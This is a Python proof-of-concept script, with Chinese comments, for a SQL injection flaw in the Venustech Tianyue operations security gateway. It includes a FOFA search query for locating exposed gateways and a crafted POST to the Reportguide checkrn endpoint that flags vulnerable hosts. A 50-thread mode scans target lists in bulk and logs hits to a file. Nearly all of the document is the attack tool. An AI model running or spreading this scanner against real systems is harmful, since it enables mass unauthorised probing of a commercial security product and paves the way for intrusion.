# 启明星辰天玥运维安全网关SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="天玥运维安全网关V6.0"

def banner():
    test = """
 ██████╗ ███╗   ███╗██╗  ██╗ ██████╗        ███████╗ ██████╗ ██╗     
██╔═══██╗████╗ ████║╚██╗██╔╝██╔════╝        ██╔════╝██╔═══██╗██║     
██║   ██║██╔████╔██║ ╚███╔╝ ██║             ███████╗██║   ██║██║     
██║▄▄ ██║██║╚██╔╝██║ ██╔██╗ ██║             ╚════██║██║▄▄ ██║██║     
╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗╚██████╗███████╗███████║╚██████╔╝███████╗
 ╚══▀▀═╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝

                            
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='启明星辰天玥运维安全网关SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/ops/index.php?c=Reportguide&a=checkrn"
    headers = {
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="88","GoogleChrome";v="88",";NotABrand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/88.0.4324.96Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = "checkname=123&tagid=123"

    try:
        response = requests.post(url=target + api_payload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and '{"msg":"","code":16,"status":0}' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()